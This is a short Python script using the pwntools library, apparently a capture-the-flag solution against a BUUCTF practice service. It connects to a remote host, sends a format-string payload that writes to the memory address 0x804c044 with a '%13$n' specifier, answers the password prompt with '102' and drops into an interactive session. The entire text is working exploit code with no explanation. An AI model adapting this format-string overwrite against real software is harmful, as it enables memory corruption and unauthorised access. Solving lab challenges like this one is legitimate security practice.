from pwn import *

context(os="linux",arch="i386")

# io = process("./pwn")
io = remote("node4.buuoj.cn",29235)

pause()
print(io.recvuntil(b"your name:"))

payload = flat(b"AA%100c%13$n",0x804c044)
pause()
io.sendline(payload)
io.recvuntil(b"passwd:")
io.sendline(b"102")

io.recv()
io.interactive()
